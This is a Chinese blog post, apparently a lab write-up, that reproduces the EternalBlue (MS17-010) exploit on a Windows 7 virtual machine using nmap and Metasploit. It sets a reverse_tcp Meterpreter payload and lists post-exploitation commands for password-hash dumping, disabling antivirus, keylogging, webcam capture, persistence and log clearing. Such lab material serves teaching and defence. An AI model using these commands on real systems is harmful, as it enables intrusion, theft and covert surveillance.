@@ -1,0 +1,727 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/atkx.png">
+  <link rel="icon" href="/img/atkx.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Atkx">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="@TOC 漏洞简介永恒之蓝：   永恒之蓝（Eternal Blue）爆发于2017年4月14日晚，是一种利用Windows系统的SMB协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机。甚至于2017年5月12日， 不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，使全世界大范围内遭受了该勒索病毒，甚至波及到学校、大型企业、政府等机构，只能通过支付高额的赎金才能恢复出文件。不过在该">
+<meta property="og:type" content="article">
+<meta property="og:title" content="永恒之蓝漏洞复现">
+<meta property="og:url" content="https://atkxor.github.io/posts/4260011972/index.html">
+<meta property="og:site_name" content="Atkx&#39;s Blog">
+<meta property="og:description" content="@TOC 漏洞简介永恒之蓝：   永恒之蓝（Eternal Blue）爆发于2017年4月14日晚，是一种利用Windows系统的SMB协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机。甚至于2017年5月12日， 不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，使全世界大范围内遭受了该勒索病毒，甚至波及到学校、大型企业、政府等机构，只能通过支付高额的赎金才能恢复出文件。不过在该">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210310195458792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210309195332545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210309195736608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210309200838719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210322112648199.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210322112847602.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210322113137566.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210309201023297.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210309201610867.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2021031020033516.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210310200620174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2021031020075272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210310201127132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2021030920270545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210309204807579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210322115653954.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210311193421574.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2021-03-11T12:28:06.000Z">
+<meta property="article:modified_time" content="2023-03-10T12:34:47.653Z">
+<meta property="article:author" content="Atkx">
+<meta property="article:tag" content="永恒之蓝">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20210310195458792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
+  
+  
+  
+  <title>永恒之蓝漏洞复现 - Atkx&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"atkxor.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Atkx</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/bg_image2.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="永恒之蓝漏洞复现"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2021-03-11 20:28" pubdate>
+          2021年3月11日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          34 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">永恒之蓝漏洞复现</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>@<a href="%E8%BF%99%E9%87%8C%E5%86%99%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9B%AE%E5%BD%95%E6%A0%87%E9%A2%98">TOC</a></p>
+<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p><strong>永恒之蓝：</strong></p>
+<blockquote>
+<p> 永恒之蓝（Eternal Blue）爆发于2017年4月14日晚，是一种利用Windows系统的SMB协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机。甚至于2017年5月12日， 不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，使全世界大范围内遭受了该勒索病毒，甚至波及到学校、大型企业、政府等机构，只能通过支付高额的赎金才能恢复出文件。不过在该病毒出来不久就被微软通过打补丁修复。</p>
+</blockquote>
+<p><strong>445端口简介</strong>：</p>
+<blockquote>
+<p> 445端口是一个毁誉参半的端口，有了它我们可以在局域网中轻松访问各种共享文件夹或共享打印机，但也正是因为有了它，黑客们才有了可乘之机，他们能通过该端口偷偷共享你的硬盘，甚至会在悄无声息中将你的硬盘格式化掉! 2017年10月，由于病毒”坏兔子”来袭，国家互联网应急中心等安全机构建议用户及时关闭计算机以及网络设备上的445和139端口 。</p>
+</blockquote>
+<p><strong>相关协议：</strong></p>
+<blockquote>
+<p>SMB协议：SMB(全称是Server MessageBlock)是一个协议名，它能被用于Web连接和客户端与服务器之间的信息沟通。SMB最初是IBM的贝瑞·费根鲍姆（Barry Feigenbaum）研制的，其目的是将DOS操作系统中的本地文件接口“中断13”改造为网络文件系统。（在进行漏洞利用时，可以配合远程桌面协议）</p>
+</blockquote>
+<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.攻击机：kali linux   192.168.182.130<br>2.靶  机：win7x64位    192.168.182.132<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p><strong>靶机</strong><br>1.关闭防火墙<br><img src="https://img-blog.csdnimg.cn/20210310195458792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>2.设置允许远程控制。<br><img src="https://img-blog.csdnimg.cn/20210309195332545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>3.禁用共享文件夹<br><img src="https://img-blog.csdnimg.cn/20210309195736608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p> <strong>真机</strong></p>
+<p>为了防止病毒逃逸感染真机，添加真机的入站规则，阻止445端口连接<br><img src="https://img-blog.csdnimg.cn/20210309200838719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>信息收集</strong><br>用kali 去ping 靶机，来测试连通性：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping -c 4 192.168.182.132 <span class="hljs-comment">#靶机IP</span><br></code></pre></td></tr></table></figure>
+<p>两台主机相互连通<br><img src="https://img-blog.csdnimg.cn/20210322112648199.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>使用nmap工具对靶机进行端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -Pn -sV -T4 192.168.182.132<span class="hljs-comment">#靶机IP</span><br></code></pre></td></tr></table></figure>
+<p>靶机的445端口开放<br><img src="https://img-blog.csdnimg.cn/20210322112847602.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>漏洞脚本检测</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap --script=vuln 192.168.182.132<span class="hljs-comment">#靶机IP</span><br></code></pre></td></tr></table></figure>
+<p>发现了永恒之蓝的漏洞编号ms17-010<br><img src="https://img-blog.csdnimg.cn/20210322113137566.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><strong>开始复现</strong><br>1.查找漏洞</p>
+<p>进入msf</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br></code></pre></td></tr></table></figure>
+<p>永恒之蓝漏洞编号为MS17-010</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">search ms17-010<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210309201023297.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>2.使用<code>use auxiliary/scanner/smb/smb_ms17_010</code>模块进行检测</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf &gt; use auxiliary/scanner/smb/smb_ms17_010<br>msf auxiliary(scanner/smb/smb_ms17_010) &gt; show options<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210309201610867.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>存在漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="hljs-built_in">set</span> RHOSTS 192.168.182.131<br><br>msf auxiliary(scanner/smb/smb_ms17_010) &gt; run<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/2021031020033516.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>2.使用<code>exploit/windows/smb/ms17_010_eternalblue</code>模块进行攻击</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf &gt; use exploit/windows/smb/ms17_010_eternalblue<br>msf exploit(windows/smb/ms17_010_eternalblue) &gt; show options<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210310200620174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>3.配置参数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">设置目标主机（靶机）<br>msf exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="hljs-built_in">set</span> RHOST 192.168.182.131<br>设置监听主机（kali）<br>msf exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="hljs-built_in">set</span> LHOST 192.168.182.130<br>设置攻击载荷<br>msf exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure>
+<p>4.开始攻击</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf exploit(windows/smb/ms17_010_eternalblue) &gt; exploit<br></code></pre></td></tr></table></figure>
+<p>攻击成功效果如下，反弹shell<br><img src="https://img-blog.csdnimg.cn/2021031020075272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>可以看到攻击机192.168.182.130的4444端口，与靶机192.168.182.129的49159端口之间已经建立了连接。</p>
+<p><strong>利用漏洞控制靶机</strong><br>在meterpreter &gt; 中可以使用以下的命令来控制靶机</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">sysinfo             <span class="hljs-comment">#查看目标主机系统信息</span><br>run scraper         <span class="hljs-comment">#查看目标主机详细信息</span><br>run hashdump        <span class="hljs-comment">#导出密码的哈希</span><br>load kiwi           <span class="hljs-comment">#加载</span><br>ps                  <span class="hljs-comment">#查看目标主机进程信息</span><br><span class="hljs-built_in">pwd</span>                 <span class="hljs-comment">#查看目标当前目录(windows)</span><br>getlwd              <span class="hljs-comment">#查看目标当前目录(Linux)</span><br>search -f *.jsp -d e:\                <span class="hljs-comment">#搜索E盘中所有以.jsp为后缀的文件</span><br>download  e:\test.txt  /root          <span class="hljs-comment">#将目标机的e:\test.txt文件下载到/root目录下</span><br>upload    /root/test.txt d:\<span class="hljs-built_in">test</span>      <span class="hljs-comment">#将/root/test.txt上传到目标机的 d:\test\ 目录下getpid              #查看当前Meterpreter Shell的进程</span><br>PIDmigrate 1384     <span class="hljs-comment">#将当前Meterpreter Shell的进程迁移到PID为1384的进程上</span><br>idletime            <span class="hljs-comment">#查看主机运行时间</span><br>getuid              <span class="hljs-comment">#查看获取的当前权限</span><br>getsystem           <span class="hljs-comment">#提权</span><br>run  killav         <span class="hljs-comment">#关闭杀毒软件</span><br>screenshot          <span class="hljs-comment">#截图</span><br>webcam_list         <span class="hljs-comment">#查看目标主机的摄像头</span><br>webcam_snap         <span class="hljs-comment">#拍照</span><br>webcam_stream       <span class="hljs-comment">#开视频</span><br>execute  参数  -f 可执行文件   <span class="hljs-comment">#执行可执行程序</span><br>run getgui -u hack -p 123    <span class="hljs-comment">#创建hack用户，密码为123</span><br>run getgui -e                <span class="hljs-comment">#开启远程桌面</span><br>keyscan_start                <span class="hljs-comment">#开启键盘记录功能</span><br>keyscan_dump                 <span class="hljs-comment">#显示捕捉到的键盘记录信息</span><br>keyscan_stop                 <span class="hljs-comment">#停止键盘记录功能</span><br>uictl  <span class="hljs-built_in">disable</span>  keyboard     <span class="hljs-comment">#禁止目标使用键盘</span><br>uictl  <span class="hljs-built_in">enable</span>   keyboard     <span class="hljs-comment">#允许目标使用键盘</span><br>uictl  <span class="hljs-built_in">disable</span>  mouse        <span class="hljs-comment">#禁止目标使用鼠标</span><br>uictl  <span class="hljs-built_in">enable</span>   mouse        <span class="hljs-comment">#允许目标使用鼠标</span><br>load                         <span class="hljs-comment">#使用扩展库</span><br>run				             <span class="hljs-comment">#使用扩展库</span><br>run persistence -X -i 5 -p 8888 -r 192.168.10.27        <span class="hljs-comment">#反弹时间间隔是5s 会自动连接</span><br>                                   192.168.27的4444端口，缺点是容易被杀毒软件查杀<br>portfwd add -l 3389 -r 192.168.11.13 -p 3389     <span class="hljs-comment">#将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址</span><br>clearev                       <span class="hljs-comment">#清除日志</span><br></code></pre></td></tr></table></figure>
+
+<p>1.显示远程主机系统信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; sysinfo<br>Computer        : WIN-RMJMPV5HNPN<br>OS              : Windows 7 (6.1 Build 7601, Service Pack 1).<br>Architecture    : x64<br>System Language : zh_CN<br>Domain          : WORKGROUP<br>Logged On Users : 2<br>Meterpreter     : x64/windows<br></code></pre></td></tr></table></figure>
+<p>2.查看用户身份：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; getuid<br>Server username: NT AUTHORITY\SYSTEM<br></code></pre></td></tr></table></figure>
+<p>3.捕捉远程主机桌面：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; screenshot<br>Screenshot saved to: /home/kali/桌面/dSBqHeNN.jpeg<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210310201127132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>4.进入shell权限<br><img src="https://img-blog.csdnimg.cn/2021030920270545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>往靶机里面上传文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Windows\System32&gt;<span class="hljs-built_in">cd</span> /d <span class="hljs-string">&quot;C:\Users\admin\Desktop&quot;</span><br><span class="hljs-built_in">cd</span> /d <span class="hljs-string">&quot;C:\Users\admin\Desktop&quot;</span><br><br>C:\Users\admin\Desktop&gt;<span class="hljs-built_in">echo</span> hello &gt;&gt;hello.txt<br><span class="hljs-built_in">echo</span> hello &gt;&gt;hello.txt<br></code></pre></td></tr></table></figure>
